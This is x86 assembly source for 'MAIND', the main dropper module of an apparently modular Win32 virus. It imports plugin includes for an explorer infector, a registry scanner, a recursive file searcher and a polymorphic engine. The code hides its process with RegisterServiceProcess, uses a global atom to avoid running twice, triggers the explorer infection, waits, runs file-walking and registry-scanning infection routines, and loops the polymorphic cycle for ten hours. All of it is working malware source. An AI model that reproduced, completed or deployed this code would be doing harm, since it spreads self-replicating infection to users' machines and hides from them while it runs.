   ; MAIND
   ; ~~~~~
   ; - main system dropper code

   include                 INCLUDE\consts.inc
   include                 INCLUDE\s2c.inc
   include                 k32man.inc
   include                 r3io.inc
   include                 dropper.inc
   include                 dpgn.inc
   include                 explorer.inc
   include                 regscan.inc
   include                 recserch.inc
   include                 walker.inc

   include                 plugin.inc
                           PLUGIN_START    MAIND, W32R3, PERMUTABLE

   handleevent:            hookevent EV_MAIND_HIDEPROCESS, _hideprocess
                           hookevent EV_MAIND_GETSTATUS, maind_getstatus
                           hookevent EV_DROPPER_START_MAIN, _maindropcode
                           stc
                           retn

   ;----------------------------------------------------------------------------

   _hideprocess:           pusha

                           mov_h   edi, RegisterServiceProcess
                           event   EV_K32MAN_GET_PROC_ADDRESS
                           or      eax, eax
                           jz      __skiphide

                           push    1
                           push    0       ; the only right way
                           call    eax

   __skiphide:             popa
                           clc
                           retn

   ;----------------------------------------------------------------------------

   ; returns: EAX==0           -- if no main dropper installed
   ;          EAX==atom handle -- if dropper installed

   maind_getstatus:        pusha
                           call    _a1
                           callX   GlobalFindAtomA
                           call    _a2
                           mov     [esp].popa_eax, eax
                           popa
                           clc
                           retn

   maind_enable:           pusha
                           call    _a1
                           callX   GlobalAddAtomA
                           call    _a2
                           popa
                           clc
                           retn

   maind_disable:          pusha
                           call    maind_getstatus
                           or      eax, eax
                           jz      __exit
                           push    eax
                           callX   GlobalDeleteAtom
   __exit:                 popa
                           clc
                           retn

   _a1:                    pop     esi
                           x_push  eax, KernelAtom~
                           push    esp
                           jmp     esi

   _a2:                    pop     esi
                           x_pop
                           jmp     esi

   ;----------------------------------------------------------------------------

   _maindropcode:          pusha

                           call    maind_getstatus
                           or      eax, eax
                           jnz     __exit

                           call    maind_enable

                           event   EV_MAIND_NOTIFY

                           event   EV_MAIND_HIDEPROCESS

                           event   EV_EXPLORER_INFECT

   IFNDEF  DEBUG
                           push    1*60*1000       ; pause: 1 min
                           callX   Sleep

                           event   EV_WALKER_RUN

                           event   EV_REGSCAN_GO
                           event   EV_RECSERCH_RUN
   ENDIF ; DEBUG

   __cycle:                event   EV_DPGN_CYCLE
                           jnc     __cycle

   IFNDEF  DEBUG
                           push    10*60*60*1000       ; pause: 10 hours
                           callX   Sleep
   ENDIF ; DEBUG

                           call    maind_disable
   __exit:

                           popa
                           stc     ; keep event
                           retn

                           PLUGIN_END
